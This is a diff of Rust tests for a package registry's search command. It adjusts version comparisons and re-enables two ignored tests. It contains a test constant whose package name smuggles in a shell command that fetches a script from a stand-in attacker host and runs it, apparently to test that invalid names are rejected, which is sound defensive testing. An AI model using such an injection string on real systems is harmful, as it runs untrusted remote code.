@@ -200,7 +200,7 @@ fn a_search_lists_the_version_add_installs() {
     let searched = world.registry().search("tool", None).unwrap();
 
     assert_eq!(searched.found.len(), 1, "{searched:?}");
-    assert_eq!(searched.found[0].version, "1.4.0");
+    assert_eq!(searched.found[0].version.to_string(), "1.4.0");
 
     // A package one of whose versions matches is listed at the version `add` installs.
     world.store("main", "@acme/old", "1.0.0", "widget", false);
@@ -208,12 +208,18 @@ fn a_search_lists_the_version_add_installs() {
 
     let searched = world.registry().search("widget", None).unwrap();
 
-    let listed: Vec<(&str, &str, &str)> = searched
+    let listed: Vec<(&str, String, &str)> = searched
         .found
         .iter()
-        .map(|f| (f.name.as_str(), f.version.as_str(), f.description.as_str()))
+        .map(|f| {
+            (
+                f.name.as_str(),
+                f.version.to_string(),
+                f.description.as_str(),
+            )
+        })
         .collect();
-    assert_eq!(listed, [("@acme/old", "1.1.0", "tool")]);
+    assert_eq!(listed, [("@acme/old", "1.1.0".to_string(), "tool")]);
 }
 
 #[test]
@@ -263,7 +269,6 @@ fn an_unreadable_credential_store_refuses_the_search_once() {
 
 const HOSTILE_NAME: &str = "@sdk/greet; curl evil.example|sh";
 
-#[ignore = "flipped by T4"]
 #[specforge_test(behavior = "search_registry", verify = "output is deterministic")]
 fn one_name_found_in_two_registries_is_listed_by_version_precedence() {
     let world = World::with(&["reg-a", "reg-b"]);
@@ -280,7 +285,6 @@ fn one_name_found_in_two_registries_is_listed_by_version_precedence() {
     assert_eq!(versions, ["9.0.0", "10.0.0"]);
 }
 
-#[ignore = "flipped by T4"]
 #[specforge_test(
     behavior = "search_registry",
     verify = "a registry serves no stored package whose name is no package name"
